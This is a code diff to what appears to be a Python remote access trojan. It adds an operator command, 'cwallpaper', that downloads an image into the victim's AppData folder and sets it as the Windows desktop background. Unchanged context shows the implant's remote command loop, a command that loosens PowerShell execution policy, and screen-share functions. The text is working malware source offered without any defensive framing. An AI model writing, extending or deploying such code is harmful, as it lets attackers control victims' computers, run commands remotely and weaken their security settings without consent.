@@ -26,6 +26,26 @@ from cryptography.hazmat.primitives.ciphers import (
 import psutil
 import urllib.request as urllib2
 import platform
+import struct
+
+
+def wallpaper():
+    download_file(appd+'\\wallpaper.jpg')
+    SPI_SETDESKWALLPAPER = 20
+    WALLPAPER_PATH = appd+'\\wallpaper.jpg'
+
+    def is_64_windows():
+        return struct.calcsize('P') * 8 == 64
+
+    def get_sys_parameters_info():
+        return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
+            else ctypes.windll.user32.SystemParametersInfoA
+
+    def change_wallpaper():
+        sys_parameters_info = get_sys_parameters_info()
+        r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)
+    change_wallpaper()
+
 def stopscreenshare():
     temp = os.getenv('tmp')
     try:
@@ -608,6 +628,9 @@ def shell():
             except:
                 reliable_send('Directory Not Found')
                 continue
+        elif command[:10] == 'cwallpaper':
+            wallpaper()
+
         elif command[:7] == 'appdata':
             try:
                 reliable_send('Going to Roaming Dir')
@@ -694,7 +717,7 @@ def shell():
                 reliable_send('[-]ERROR')
                 continue
         elif command[:12] == 'changepolicy':
-            reliable_send('you will be able now to run powershell script')
+            reliable_send('Now you will be able now to run powershell script')
             changeexecutionpolicy()
         elif command[:15] == 'ssharescreen':
 
